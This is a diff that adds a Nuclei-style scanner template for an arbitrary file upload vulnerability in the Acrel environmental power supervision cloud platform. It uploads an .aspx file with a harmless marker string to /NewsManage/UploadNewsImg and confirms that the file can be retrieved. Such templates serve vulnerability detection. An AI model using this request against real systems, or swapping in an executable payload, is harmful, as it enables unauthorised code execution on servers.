@@ -1,0 +1,49 @@
+id: ankerui-UploadNewsImg-upload
+
+info:
+  name: 安科瑞环保用电监管云平台 UploadNewsImg 任意文件上传漏洞
+  author: ankerui
+  severity: high
+  tags: ankerui
+
+http:
+  - raw:
+      - |
+        POST /NewsManage/UploadNewsImg HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1v98KI1jc9w1bG97
+        Cache-Control: no-cache
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36
+
+        ------WebKitFormBoundary1v98KI1jc9w1bG97
+        Content-Disposition: form-data; name="file"; filename="ads96qq.aspx"
+        
+        testtest12346844
+        ------WebKitFormBoundary1v98KI1jc9w1bG97--
+
+      - |+
+        GET /UpLoad/News/{{uploads}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+
+
+    extractors:
+       - type: regex 
+         part: body
+         name: uploads
+         group: 1
+         regex:
+           - '([a-zA-Z0-9-]+\.aspx)'
+         internal: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "testtest12346844"
+        part: body_2
+      - type: status
+        status: 
+          - 200
